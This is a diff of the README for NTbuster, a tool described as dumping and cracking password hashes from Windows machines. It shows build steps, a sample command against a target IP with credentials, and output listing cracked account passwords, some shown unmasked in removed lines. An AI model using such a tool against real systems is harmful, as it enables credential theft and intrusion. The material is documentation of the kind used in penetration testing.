@@ -8,18 +8,15 @@ NTbuster is designed to connect to Windows machines and dump password hashes. It
 ```bash
 git clone https://github.com/ch1nghz/NTbuster
 cd NTbuster
-git submodule init
-git submodule update
-sudo apt-get update && sudo apt-get install -y libhiredis-dev
 make
 ```
 
 ## System Requirements
-At least 8GB free memory and 4 CPU cores
+A system with a minimum of 8GB of available memory and a CPU containing at least 4 cores is recommended.
 
 ## Running NTbuster
 ```
-./bin/NTbuster --target-ip 172.16.57.2 -u testuser -p 123456
+./bin/NTbuster -t 172.16.57.2 -u testuser -p 123456 -m 2
     _   __________               __           
    / | / /_  __/ /_  __  _______/ /____  _____
   /  |/ / / / / __ \/ / / / ___/ __/ _ \/ ___/
@@ -27,11 +24,10 @@ At least 8GB free memory and 4 CPU cores
 /_/ |_/ /_/ /_.___/\__,_/____/\__/\___/_/     
 
 [*] Dumping hashes...
-[+] Hashes dumped!
 [*] Parsing dumped hashes...
 [*] The password of 'client' is cracking...
-[+] Cracked: ['client':'client1993!@#']
+[*] The password of 'netadmin' is cracking...
+[+] Cracked: ['netadmin':'net*******']
 [*] The password of 'sysadmin' is cracking...
-[+] Cracked: ['sysadmin':'sysadmin12345']
-[*] The password of 'hacker1337' is cracking...
+[+] Cracked: ['client':'cli**********']
 ```
